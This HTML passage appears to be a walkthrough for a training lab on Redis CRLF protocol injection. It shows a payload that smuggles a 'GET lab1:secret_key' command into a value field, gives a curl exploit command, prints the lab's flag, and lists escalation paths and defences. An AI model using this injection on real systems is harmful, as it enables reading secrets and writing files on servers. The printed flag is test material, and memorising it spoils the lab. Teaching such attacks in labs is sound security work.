<h4>Step 1: Test Normal SET Command</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal SET</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Key: </span>testkey &nbsp; <span class="prompt">Value: </span>hello<br>
        <span class="prompt">Protocol: </span>SET lab1:testkey hello\r\n<br><br>
        <span class="prompt">redis> </span>SET lab1:testkey hello<br>
        <span class="prompt">Result: </span>OK
    </div>
</div>

<h4>Step 2: Inject CRLF to Execute GET</h4>
<p>
    Redis uses <code>\r\n</code> (CRLF) to separate commands. If the value contains
    <code>\r\n</code>, everything after it becomes a new command. Inject
    <code>\r\nGET lab1:secret_key</code> to read the secret key.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. CRLF Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Value: </span>hello\r\nGET lab1:secret_key<br>
        <span class="prompt">URL-encoded: </span>value=hello%0d%0aGET%20lab1:secret_key<br><br>
        <span class="prompt">redis> </span>SET lab1:testkey hello<br>
        <span class="prompt">Result: </span>OK<br>
        <span class="prompt">redis> </span>GET lab1:secret_key<br>
        <span class="prompt">Result: </span><strong>FLAG{rd_crlf_pr0t0c0l_1nj}</strong>
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{rd_crlf_pr0t0c0l_1nj}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/redis/lab1" \<br> --data-urlencode "key=testkey" \<br>
        &nbsp;&nbsp;--data-urlencode $'value=hello\r\nGET lab1:secret_key'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Redis uses the RESP (REdis Serialization Protocol) where
    commands are separated by <code>\r\n</code>. When user input is concatenated into raw
    protocol strings (inline commands), CRLF characters break out of the current command
    and inject new ones. An attacker can execute any Redis command: <code>GET</code>,
    <code>CONFIG SET</code>, <code>EVAL</code> (Lua scripting), or even write files via
    <code>CONFIG SET dir/dbfilename</code> + <code>SAVE</code>. Defense: use RESP arrays
    (binary-safe encoding) instead of inline commands, or strip <code>\r\n</code> from input.
</div>
